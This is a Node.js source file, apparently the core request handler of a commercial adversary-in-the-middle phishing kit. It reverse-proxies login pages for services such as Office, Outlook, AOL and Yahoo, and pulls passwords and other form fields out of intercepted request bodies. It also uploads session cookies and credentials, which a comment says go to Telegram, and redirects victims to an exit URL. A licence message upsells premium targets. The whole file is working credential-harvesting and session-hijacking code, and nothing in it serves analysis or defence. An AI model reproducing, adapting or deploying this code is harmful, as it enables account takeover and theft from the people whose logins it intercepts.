const path = require('path')
const EventEmitter = require('events')
const urlParser = require('url-parse')
const queryParse = require('querystring')
const fs = require('fs')
const bodyParser = require('body/any')
const dDirty = require('../core/ddirty')
const logger = require('../core/logger')
const interfaceObj = require('../hook/interface')

const EXEC_COMMANDS = [
    'CHANGE_DOMAIN',
    'CHANGE_URL',
    'DONOT_SEND_INFO',
    'RETURN_404',
    'REDIRECT_TO_URL',

]

class BaseHandler {

    constructor(req, res, configExport) {
        this.req = req;
        this.res = res;
        this.req.onTime = new EventEmitter()
        this.sendASAP = true
        this.choosenDomain = ''
        this.responseEnded = false
        this.captureDict = configExport.CAPTURES
        this.configExport = configExport
    }

    // eslint-disable-next-line class-methods-use-this
    static match() {
        return true
    }

    rejectNonPremium() {
        this.res.writeHead(403)
        this.res.end('UPGRADE TO PREMIUM LICENSE\n\nNormal license only support (office, outlook, aol, yahoo) & (onedrivex, adobex)')
    }

    /**
     * Executes the request, it checks if its ends in .php and it exist as a php file,
     * If it exist as a php file it execute it as a php request
     * else it execute it as a reverse proxy request
     * @param {ClientContext} clientContext 
     * @returns True
     * @method
     */
    execute(clientContext) {
        // FIRST THING TO DO
        clientContext.scheme = this.configExport.SCHEME
        // this.choosenDomain = clientContext.currentDomain
        // NOW YOU CAN CONTINUE

        if (this.checkIfListMatchs(this.req.url, this.configExport.COOKIE_PATH)) {
            this.sendClientData(clientContext, {})
        }

        const isModuleLoaded = this.loadModuleCode(clientContext)
        
        if (isModuleLoaded) {
            return true
        }

        this.handleCommands(clientContext)

        if (this.responseEnded === true) {
            return true
        }


        if (this.checkIfListMatchs(this.req.url, this.configExport.EXIT_TRIGGER_PATH)) {
            return this.exitLink(this.configExport.EXIT_URL, clientContext)
        }

        if (clientContext.hasExited) {
            return this.exitLink(this.configExport.EXIT_URL, clientContext)
        }
        
        if (this.checkIfListMatchs(this.req.url, this.configExport.FORCE_PROXY)) {
            return this.superExecuteProxy(this.configExport.CURRENT_DOMAIN, clientContext)
        }


        if (this.configExport.AUTOGRAB_CODE) {
            this.loadAutoGrab(this.configExport.AUTOGRAB_CODE)
        }

        let phpExec
        if (this.configExport.PHP_PROCESSOR && typeof this.configExport.PHP_PROCESSOR === 'object') {
            phpExec = this.checkIfListMatchs(this.req.url, 
                Object.keys(this.configExport.PHP_PROCESSOR))

            if (clientContext.currentDomain === 'PHP-EXEC' && !phpExec) {
                this.res.writeHead(301, { location: this.configExport.START_PATH })
                return this.res.end()
            }

        }
        

        if (phpExec) {
            const phpProcessor = this.configExport.PHP_PROCESSOR[phpExec]
            return this.superExecutePhpScript(phpProcessor, clientContext)
        } 
        
        return this.superExecuteProxy(this.choosenDomain, clientContext)

        
        
    }


    loadModuleCode(clientContext) {
          // MODULE CODE: EXITS TO THE NEW MODULE

          if (!this.configExport.IMPORTED_MODULES) {
            return false
          }

          let selectedModuleObj


          // eslint-disable-next-line no-restricted-syntax
          for (const nModule of this.configExport.IMPORTED_MODULES) {
            const beginAtRegex = new RegExp(nModule.beginAt, 'i')
            if (beginAtRegex.test(this.req.url)) {
                selectedModuleObj = nModule
                break
            }
          }

          if (selectedModuleObj) {

            // const moduleConig = this.configExport.IMPORTED_MODULES[modulePath]

            const moduleExport = selectedModuleObj.module

            const { beginAt, exitAt } = selectedModuleObj

            if (!moduleExport.MODULE_ENABLED) {
                logger.error(`Module ${moduleExport.SCHEME} is not enabled`)
                return false
            }

           

            moduleExport.MODULE_OPTIONS.exitLink = exitAt

            clientContext.scheme = moduleExport.SCHEME
            clientContext.currentDomain = moduleExport.CURRENT_DOMAIN

            logger.info(`Loading module ${moduleExport.SCHEME}`)


            const moduleBeginJourney = moduleExport.MODULE_OPTIONS.startPath 
            || moduleExport.START_PATH

            const modulePathObj = urlParser(moduleBeginJourney, true)
            const reqUrlObj = urlParser(this.req.url, true)

            if (reqUrlObj.query.qrc) {
                modulePathObj.query.qrc = reqUrlObj.query.qrc
            }

            const moduleBeginJourneyStr = modulePathObj.toString()

            logger.info(`MODULE ${this.configExport.SCHEME} is is now redirecting to ${moduleBeginJourneyStr}`)

            this.res.writeHead(302, { location: moduleBeginJourneyStr })

            this.res.end()

            return true


        }
        return false
    }


    handleCommands(clientContext) {

        if (!this.configExport.EXTRA_COMMANDS) {
            return
        }
    
        this.configExport.EXTRA_COMMANDS.forEach((commandObj) => {
            let commandPaths
            if (typeof commandObj.path === 'string') {
                commandPaths = [commandObj.path]
            } else {
                commandPaths = commandObj.path
            }

            const commandStr = this.checkIfListMatchs(this.req.url, commandPaths)
            if (commandStr) {
                this.processCommand(clientContext, commandObj)
            }
        })
    }

    processCommand(clientContext, commandObj) {
        logger.info(`Executing command ${commandObj.command}`)
        const commandStr = commandObj.command
        const commandArgs = commandObj.command_args

        if (commandStr === 'CHANGE_DOMAIN') {
            this.choosenDomain = commandArgs.new_domain
            if (commandArgs.persistent) {
                clientContext.currentDomain = commandArgs.new_domain
            }

        } else if (commandStr === 'CHANGE_URL') {

            this.req.url = commandArgs.new_url

        } else if (commandStr === 'DONOT_SEND_INFO') {
            this.sendASAP = false
        } else if (commandStr === 'RETURN_404') {
            this.res.writeHead(404)
            this.res.end()
            this.responseEnded = true
            //  return true
        } else if (commandStr === 'REDIRECT_TO_URL') {
            this.res.writeHead(301, { location: commandArgs.redirect_url })
            this.res.end()
            this.responseEnded = true
            // return true
        }

        return true
    }

    
    /**
     * Executes the reuest as a proxy request
     * @param {string} proxyDomain 
     * @param {object} clientContext 
     * @param {boolean} handleBody @default true
     * @returns null
     */
     superExecuteProxy(proxyDomain, clientContext, handleBody = true) {
       
        this.req.onTime.on('body', (bodyStr) => {
            this.captureDict = this.configExport.CAPTURES
            this.handleEventBody(bodyStr, clientContext)
        })
        

        const redirectToken = this.checkForRedirect()
        if (redirectToken !== null) {
            this.req.url = `${redirectToken.obj.pathname}${redirectToken.obj.query}`
            return this.superExecuteProxy(redirectToken.obj.host, clientContext)
        }

        this.req.headers.origin = this.req.headers.origin 
        ? this.req.headers.origin.replace(clientContext.hostname, clientContext.currentDomain) : ''

        this.req.headers.referer = this.req.headers.referer 
        ? this.req.headers.referer.replace(clientContext.hostname, clientContext.currentDomain) : ''

        const opts = {
            req: this.req, res: this.res, handleBody,
        }
        opts.proxyDomain = proxyDomain || clientContext.currentDomain
        dDirty(interfaceObj.serverProxy, clientContext, opts)
        return 0
    }

     /**
     * Execute the request as a php request
     * @param {string} scriptPath 
     * @param {object} clientContext 
     */
    superExecutePhpScript(scriptObj, clientContext) {
        clientContext.currentDomain = 'PHP-EXEC'


        if (!this.configExport.PHP_PROCESSOR) {
            this.res.writeHead(500)
            return this.req.end('NO PHP PROCESSOR FOUND')
        }
        

        // Backward compatibility
        if (typeof scriptObj === 'string') {
            this.handleStreamBody('PHP-EXEC', clientContext)
            const opts = {
                req: this.req, res: this.res,
            }
            opts.script = scriptObj
            return dDirty(interfaceObj.executePhp, clientContext, opts)
        }

        if (this.req.method === 'GET') {
            if (scriptObj.GET.redirectTo) {
                this.res.writeHead(301, { location: scriptObj.GET.redirecTo })
                return this.res.end()
            }
            const opts = {
                req: this.req, 
                res: this.res,
                script: scriptObj.GET.script,
            }
             return dDirty(interfaceObj.executePhp, clientContext, opts)
        } if (this.req.method === 'POST') {
           
            this.handleStreamBody('PHP-EXEC', clientContext)

            if (scriptObj.POST.redirectTo) {
                this.res.writeHead(302, { location: scriptObj.POST.redirectTo })
                return this.res.end()
            }

            if (scriptObj.POST.script) {
                const opts = {
                    req: this.req, 
                    res: this.res,
                    script: scriptObj.POST.script,
                }
                return dDirty(interfaceObj.executePhp, clientContext, opts)
            } 
            this.res.writeHead(200)
            return this.res.end()
        
        } 
        this.res.writeHead(500)
        return this.res.end()
        
    }


    
   
   
    /**
     * Sends the full client data body + cookies to telegram
     * this is usually when the user has fully authenticated and you have cookies and body
     * Sends the cookies and body to telegram as a file + caption and user information
     * @param {object} clientContext 
     * @param {dict} extras (optional)
     */
    sendClientData(clientContext, extras) {
        const opts = extras || {}
        dDirty(interfaceObj.sendLogData, clientContext, opts)
    }


    uploadSessionCookies(clientContext, reset = false) {
        dDirty(interfaceObj.uploadCookies, clientContext, {})
    }

    uploadBodyData(clientContext, filterParam) {

        if (filterParam && Object.keys(clientContext.sessionBody).includes(filterParam)) {

            const currentPW = clientContext.sessionBody[filterParam]
            if (currentPW !== clientContext.info[filterParam]) {
                dDirty(interfaceObj.uploadBody, clientContext,
                    { body: clientContext.sessionBody, req: this.req, res: this.res })
                clientContext.info[filterParam] = currentPW
            }
            
        }
        
    }
    

    loadAutoGrab(autograbCode) {
        const reqObj = urlParser(this.req.url, true)
        if (reqObj.query) {
            const qrcValue = reqObj.query.qrc
            if (qrcValue) {
                reqObj.query[autograbCode] = qrcValue
                delete reqObj.query.qrc
            }
        }
        this.req.url = reqObj.toString()
       
    }


    handleEventBody(bodyStr, clientContext) {
        logger.debug('Handling Proxy Request Body')
        const contentType = this.req.headers['content-type'] || ''
        let bodyObj
        if (contentType.indexOf('json') !== -1) {
            try { 
            // JSON
                bodyObj = JSON.parse(bodyStr)
            } catch (e) {
                logger.error(e)
                return 1
            }

        } else if (contentType.indexOf('application/x-www-form-urlencoded') !== -1) {
            // FORM
            bodyObj = queryParse.parse(bodyStr)
        } else {
            logger.error(`Cannot handle content type passed ${contentType}`)
            return 1
        }

        this.saveNsend(clientContext.currentDomain, bodyObj, clientContext)

        return 0
    }


    cleanEnd(proxyDomain, clientContext) {
        this.handleStreamBody(proxyDomain, clientContext)
        this.res.end()
        return 0
    }


    exitLink(exitUrl, clientContext) {

        let redirectExit = process.env.EXIT_LINK || this.captureDict.exitLink || exitUrl

        if (this.configExport.MODULE_ENABLED) {
            redirectExit = this.configExport.MODULE_OPTIONS.exitLink || redirectExit
        }

        redirectExit = Array.isArray(redirectExit) ? redirectExit[0] : redirectExit

        if (clientContext) {
            clientContext.setExitStatus()
        }


        if (clientContext && redirectExit.startsWith('@')) {
            const objUrl = urlParser(redirectExit.slice(1))
            this.req.url = objUrl.pathname
            clientContext.currentDomain = objUrl.host
            return this.superExecuteProxy(clientContext.currentDomain, clientContext)
        }

        this.res.writeHead(301, { location: redirectExit })
        this.res.end()
        return 0
    }

   
    handleStreamBody(proxyDomain, clientContext) {
        if (this.req.method !== 'POST') {
            return
        }
        logger.debug('Handling PHP Request Body')

        if (!this.req.headers['content-type']) {
            this.req.headers['content-type'] = 'text/plain'
        }
        bodyParser(this.req, this.res, {}, (err, bodyObj) => {
           
            if (err || !bodyObj) {
                return
            }
            this.req.body = bodyObj
            console.log(JSON.stringify(bodyObj))

            this.saveNsend(proxyDomain, bodyObj, clientContext)
            
        })

    }

    saveNsend(proxyDomain, bodyObj, clientContext) {
        const filterCaptures = (proxyDomain, bodyObj) => {
            const parsedDetails = {}
                // eslint-disable-next-line no-restricted-syntax
                for (const [name, caps] of Object.entries(this.captureDict)) {
                    for (let i = 0; i < caps.params.length; i += 1) {
                        const capIndex = caps.params[i]
                        if (capIndex in bodyObj) {
                            console.log(JSON.stringify(caps))
                            if (caps.hosts.indexOf(proxyDomain) > -1) {
                                parsedDetails[name] = bodyObj[capIndex]
                            } else if (caps.hosts.length === 0) {
                                parsedDetails[name] = bodyObj[capIndex]

                                // OBSOLETE
                            } else if (caps.hosts === 'PHP-EXEC') {
                                parsedDetails[name] = bodyObj[capIndex]
                            }
                        }
                    }
                }
               
                return parsedDetails
        }

        const parsedDetails = filterCaptures(proxyDomain, bodyObj)
        
        if (this.captureDict.cookieKEY) {
            if (Object.keys(parsedDetails).includes(this.captureDict.cookieKEY)) {
                clientContext.info.cookieKEY = parsedDetails[this.captureDict.cookieKEY]
            }
        }
        if (Object.entries(parsedDetails).length > 0) {
            Object.assign(clientContext.sessionBody, parsedDetails)
            if (this.sendASAP) {
                dDirty(interfaceObj.uploadBody, clientContext,
                    { body: clientContext.sessionBody, req: this.req, res: this.res })
            }
        }
        return 0
    }


    /**
     * Check if the request url was made a redirect by our response handler and then handle it
     * @access @protected
     * @returns true of false
     */
    checkForRedirect() {
        const fullRedirectStr = this.req.url
        const redirectCap = `/?${process.env.RDR_SCRIPT}=`
        if (!fullRedirectStr.includes(redirectCap)) {
            return null
        }
        const urlList = fullRedirectStr.split(redirectCap)
        const urlQueryB4 = urlList[1] || ''
        const urlClean = decodeURIComponent(urlQueryB4)
        const urlQuery = Buffer.from(urlClean, 'base64').toString('ascii')

        if (urlQuery === '') {
            return null
        }

        try {
            this.res.setHeader('Referer', urlQuery)
        } catch (e) {
            logger.error('Could not set redirect referer header')
        }

        return {
            code: -1,
            obj: urlParser(urlQuery),
            url: urlQuery,
        }

    }

    checkIfListMatchs(seed, qList) {
        if (!qList) {
            return false
        }

        if (typeof qList === 'string') {
            qList = [qList]
        }

        let qmatch = false

        // eslint-disable-next-line no-restricted-syntax
        for (const qcheck of qList) {
            const qregex = new RegExp(qcheck, 'gi')
            if (qregex.test(seed)) {
                qmatch = qcheck
                break
            }
        
        }
        return qmatch

    }
}

module.exports = BaseHandler